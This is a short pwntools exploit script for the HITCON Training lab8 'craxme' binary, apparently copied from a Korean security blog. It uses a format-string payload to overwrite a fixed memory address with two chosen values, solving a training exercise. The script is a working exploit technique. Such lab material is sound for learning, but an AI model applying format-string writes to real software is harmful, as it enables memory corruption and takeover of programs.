from pwn import *
 
context.log_level = 'debug'
magic_addr = 0x0804a038
offset = 7 
 
proc = process("./craxme")
 
proc.recv()
payload = fmtstr_payload(offset, {magic_addr:0xda})
 
proc.sendline(payload)
log.info(proc.recvuntil('!'))
 
 
proc = process("./craxme")
 
proc.recv()
payload = fmtstr_payload(offset, {magic_addr:0xfaceb00c})
 
proc.sendline(payload)
log.info(proc.recvuntil('!'))


출처: https://bachs.tistory.com/entry/HITCON-Training-lab8-FormatString [Bach`s Blog]